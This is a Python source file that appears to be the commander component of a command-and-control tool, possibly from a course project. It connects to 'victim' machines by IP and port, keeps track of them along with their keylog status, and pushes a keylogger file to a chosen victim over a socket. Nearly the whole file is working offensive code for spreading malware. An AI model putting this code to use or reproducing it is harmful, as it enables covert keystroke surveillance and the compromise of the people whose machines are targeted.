import getopt
import sys
import socket
import constants
import ipaddress


def display_menu():
    print(constants.MENU_CLOSING_BANNER)
    print(constants.MENU_ITEM_ONE)
    print(constants.MENU_ITEM_TWO)
    print(constants.MENU_ITEM_THREE)
    print(constants.MENU_ITEM_FOUR)
    print(constants.MENU_ITEM_FIVE)
    print(constants.MENU_ITEM_SIX)
    print(constants.MENU_ITEM_SEVEN)
    print(constants.MENU_ITEM_EIGHT)
    print(constants.MENU_ITEM_NINE)
    print(constants.MENU_ITEM_TEN)
    print(constants.MENU_ITEM_ELEVEN)
    print(constants.MENU_ITEM_TWELVE)
    print(constants.MENU_ITEM_THIRTEEN)
    print(constants.MENU_CLOSING_BANNER)


def get_menu_selection():
    while True:
        try:
            choice = int(input(constants.MENU_SELECTION_PROMPT_MSG))
            while not (constants.MIN_MENU_ITEM_VALUE <= choice <= constants.MAX_MENU_ITEM_VALUE):
                choice = int(input(constants.INVALID_MENU_SELECTION_PROMPT))
            break
        except ValueError as e:
            print(constants.INVALID_INPUT_MENU_ERROR.format(e))

    print(constants.MENU_ACTION_START_MSG.format(choice))
    print(constants.MENU_CLOSING_BANNER)
    return choice


def print_config(dest_ip: str, dest_port: int, server_address: tuple):
    print(constants.INITIAL_VICTIM_IP_MSG.format(dest_ip))
    print(constants.INITIAL_VICTIM_PORT_MSG.format(dest_port))
    print(constants.SERVER_INFO_MSG.format(*server_address))
    print(constants.MENU_CLOSING_BANNER)


def parse_arguments():
    # Initialization
    print(constants.OPENING_BANNER)
    source_ip, source_port, destination_ip, destination_port = "", "", "", ""

    # GetOpt Arguments
    arguments = sys.argv[1:]
    opts, user_list_args = getopt.getopt(arguments,
                                         's:c:d:p:',
                                         ["src_ip", "src_port", "dst_ip", "dst_port"])

    if len(opts) == constants.ZERO:
        sys.exit(constants.NO_ARG_ERROR)

    for opt, argument in opts:
        if opt == '-s' or opt == '--src_ip':  # For source IP
            try:
                if argument == constants.LOCAL_HOST:
                    argument = constants.LOCAL_HOST_VALUE
                source_ip = str(ipaddress.ip_address(argument))
            except ValueError as e:
                sys.exit(constants.INVALID_SRC_IP_ADDRESS_ARG_ERROR.format(e))

        if opt == '-c' or opt == '--src_port':  # For source port
            try:
                source_port = int(argument)
                if not (constants.MIN_PORT_RANGE < source_port < constants.MAX_PORT_RANGE):
                    sys.exit(constants.INVALID_SRC_PORT_NUMBER_RANGE)
            except ValueError as e:
                sys.exit(constants.INVALID_FORMAT_SRC_PORT_NUMBER_ARG_ERROR.format(e))

        if opt == '-d' or opt == '--dst_ip':  # For destination IP
            try:
                if argument == constants.LOCAL_HOST:
                    argument = constants.LOCAL_HOST_VALUE
                destination_ip = str(ipaddress.ip_address(argument))
            except ValueError as e:
                sys.exit(constants.INVALID_DST_IP_ADDRESS_ARG_ERROR.format(e))

        if opt == '-p' or opt == '--dst_port':  # For destination port
            try:
                destination_port = int(argument)
                if not (constants.MIN_PORT_RANGE < destination_port < constants.MAX_PORT_RANGE):
                    sys.exit(constants.INVALID_DST_PORT_NUMBER_RANGE)
            except ValueError as e:
                sys.exit(constants.INVALID_FORMAT_DST_PORT_NUMBER_ARG_ERROR.format(e))

    # Check if IPs and Ports were specified
    if len(source_ip) == constants.ZERO:
        sys.exit(constants.NO_SRC_IP_ADDRESS_SPECIFIED_ERROR)

    if len(str(source_port)) == constants.ZERO:
        sys.exit(constants.NO_SRC_PORT_NUMBER_SPECIFIED_ERROR)

    if len(destination_ip) == constants.ZERO:
        sys.exit(constants.NO_DST_IP_ADDRESS_SPECIFIED_ERROR)

    if len(str(destination_port)) == constants.ZERO:
        sys.exit(constants.NO_DST_PORT_NUMBER_SPECIFIED_ERROR)

    return source_ip, source_port, destination_ip, destination_port


def initialize_server_socket(source_ip: str, source_port: int):
    try:
        server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

        # Bind the socket to a specific host and port
        server_address = (source_ip, source_port)
        server_socket.bind(server_address)

        # Listen for incoming connections
        server_socket.listen(constants.MIN_QUEUE_SIZE)

        return server_socket
    except PermissionError as e:
        sys.exit(constants.COMMANDER_SERVER_SOCKET_CREATION_ERROR_MSG.format(str(e)))


def initial_connect_to_client(sockets_list: list, connected_clients: dict,
                              dest_ip: str, dest_port: int):
    try:
        # Create a new client socket and initiate the connection
        print(constants.INITIATE_VICTIM_CONNECTION_MSG)
        target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        target_socket.connect((dest_ip, dest_port))
        print(constants.SUCCESSFUL_VICTIM_CONNECTION_MSG.format((dest_ip, dest_port)))

        # Add the new client socket to the connected_clients dictionary (Key/Value pair)
        connected_clients[target_socket] = (dest_ip, dest_port, False)
        sockets_list.append(target_socket)
        return target_socket

    except Exception as e:
        print(constants.ERROR_VICTIM_CONNECTION_MSG.format(str(e)))
        return None


def connect_to_client_with_prompt(sockets_list: list, connected_clients: dict):
    try:
        # Prompt user input
        try:
            target_ip = str(ipaddress.ip_address(input("[+] Enter victim IP address: ")))
            target_port = int(input("[+] Enter victim port: "))
        except ValueError as e:
            print(constants.INVALID_INPUT_ERROR.format(e))
            return False, None, None, None

        # Create a new client socket and initiate the connection
        print(constants.INITIATE_VICTIM_CONNECTION_MSG)
        target_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        target_socket.connect((target_ip, target_port))
        print(constants.SUCCESSFUL_VICTIM_CONNECTION_MSG.format((target_ip, target_port)))

        # Add the new client socket to the connected_clients dictionary (Key/Value pair)
        connected_clients[target_socket] = (target_ip, target_port, False)
        sockets_list.append(target_socket)

        # Print closing statements
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)

        return True, target_socket, target_ip, target_port

    except Exception as e:
        print(constants.ERROR_VICTIM_CONNECTION_MSG.format(str(e)))
        print(constants.RETURN_MAIN_MENU_MSG)
        print(constants.MENU_CLOSING_BANNER)
        return False, None, None, None


def process_new_connections(server_socket: socket.socket, sockets_to_read: list,
                            client_dict: dict):
    client_socket, client_address = server_socket.accept()
    print(constants.NEW_CONNECTION_MSG.format(client_address))
    sockets_to_read.append(client_socket)
    client_dict[client_socket] = (client_address, False)
    print(constants.MENU_CLOSING_BANNER)


def disconnect_from_client(sockets_list: list, connected_clients: dict):
    # CHECK: If connected_clients is empty
    if len(connected_clients) == constants.ZERO:
        print(constants.DISCONNECT_FROM_VICTIM_ERROR)
    else:
        # Get prompt for target ip and port
        try:
            target_ip = str(ipaddress.ip_address(input(constants.ENTER_TARGET_IP_DISCONNECT_PROMPT)))
            target_port = int(input(constants.ENTER_TARGET_PORT_DISCONNECT_PROMPT))
            keylog_status = False

            # CHECK: if client is present in connected_clients list
            if (target_ip, target_port, keylog_status) in connected_clients.values():
                print(constants.DISCONNECT_FROM_VICTIM_MSG.format((target_ip, target_port)))

                for client_sock, (ip, port, _) in connected_clients.items():
                    if ip == target_ip and port == target_port:
                        target_socket = client_sock

                        # Remove client from both socket and connected_clients list
                        sockets_list.remove(target_socket)
                        del connected_clients[target_socket]

                        # Close socket
                        target_socket.close()

                        print(constants.DISCONNECT_FROM_VICTIM_SUCCESS)
                        break
            else:
                print(constants.DISCONNECT_FROM_VICTIM_ERROR)
        except ValueError as e:
            print(constants.INVALID_INPUT_ERROR.format(e))

    print(constants.RETURN_MAIN_MENU_MSG)
    print(constants.MENU_CLOSING_BANNER)


def transfer_file(sock: socket.socket,
                  dest_ip: str,
                  dest_port: int):
    # Send to victim a notification that it is transferring a file
    sock.send(constants.TRANSFER_KEYLOG_MSG.encode())
    ack = sock.recv(constants.BYTE_LIMIT).decode()

    if ack == constants.RECEIVED_CONFIRMATION_MSG:
        # Send file name
        sock.send(constants.KEYLOG_FILE_NAME.encode())
        print(constants.FILE_NAME_TRANSFER_MSG.format(constants.KEYLOG_FILE_NAME))

        # Open and Read the file to be sent
        with open(constants.KEYLOG_FILE_NAME, 'rb') as file:
            while True:
                data = file.read(constants.BYTE_LIMIT)
                if not data:
                    break
                sock.send(data)

        # Send EOF signal to prevent receiver's recv() from blocking
        sock.send(constants.END_OF_FILE_SIGNAL)

        # Get an ACK from victim for success
        transfer_result = sock.recv(constants.BYTE_LIMIT).decode()

        if transfer_result == constants.VICTIM_ACK:
            print(constants.FILE_TRANSFER_SUCCESSFUL.format(constants.KEYLOG_FILE_NAME,
                                                            dest_ip,
                                                            dest_port))
        else:
            print(constants.FILE_TRANSFER_ERROR.format(transfer_result))


def find_specific_client_socket(client_dict: dict,
                                target_ip: str,
                                target_port: int):
    try:
        # Initialize Variables
        target_socket = None

        # Check target_ip and target_port
        ipaddress.ip_address(target_ip)

        # Find a specific client socket from client socket list to send data to
        for client_sock, (ip, port, _) in client_dict.items():
            if ip == target_ip and port == target_port:
                target_socket = client_sock
                break

        # Check if target_socket is not None and return
        if target_socket:
            return target_socket, target_ip, target_port
        else:
            return None, None, None

    except ValueError as e:
        print(constants.INVALID_INPUT_ERROR.format(e))
        return None, None, None


def perform_menu_item_3(client_dict: dict):
    # Check if client list is empty
    if len(client_dict) == constants.ZERO:
        print(constants.FILE_TRANSFER_NO_CONNECTED_CLIENTS_ERROR)

    # Handle single client in client list
    if len(client_dict) == constants.CLIENT_LIST_INITIAL_SIZE:
        client_socket, (client_ip, client_port, _) = next(iter(client_dict.items()))
        transfer_file(client_socket, client_ip, client_port)

    # Send keylogger to any specific connected victim
    elif len(client_dict) != constants.ZERO:
        target_ip = input(constants.ENTER_TARGET_IP_FIND_PROMPT)
        target_port = int(input(constants.ENTER_TARGET_PORT_FIND_PROMPT))
        target_socket, target_ip, target_port = find_specific_client_socket(client_dict,
                                                                            target_ip, target_port)
        if target_socket:
            transfer_file(target_socket, target_ip, target_port)
        else:
            print(constants.TARGET_VICTIM_NOT_FOUND)

    print(constants.RETURN_MAIN_MENU_MSG)
    print(constants.MENU_CLOSING_BANNER)
